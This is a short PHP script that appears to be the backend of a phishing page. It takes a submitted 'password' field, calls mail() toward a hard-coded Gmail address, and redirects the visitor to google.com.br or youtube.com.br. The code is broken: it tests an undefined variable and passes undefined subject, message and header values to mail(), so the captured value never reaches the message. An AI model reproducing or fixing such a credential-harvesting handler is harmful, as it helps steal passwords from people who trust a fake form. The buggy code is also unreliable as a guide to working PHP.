<?php 

    if(isset($_POST['btn-send']))
    {
       $UserName = $_POST['password'];

       if(empty($password) )
       {
           header('location:youtube.com.br');
       }
       else
       {
           $to = "cinclywebtech5645@gmail.com";

           if(mail($to,$Subject,$Msg,$Email))
           {
               header("location:google.com.br");
           }
       }
    }
    else
    {
        header("location:index.php");
    }
?>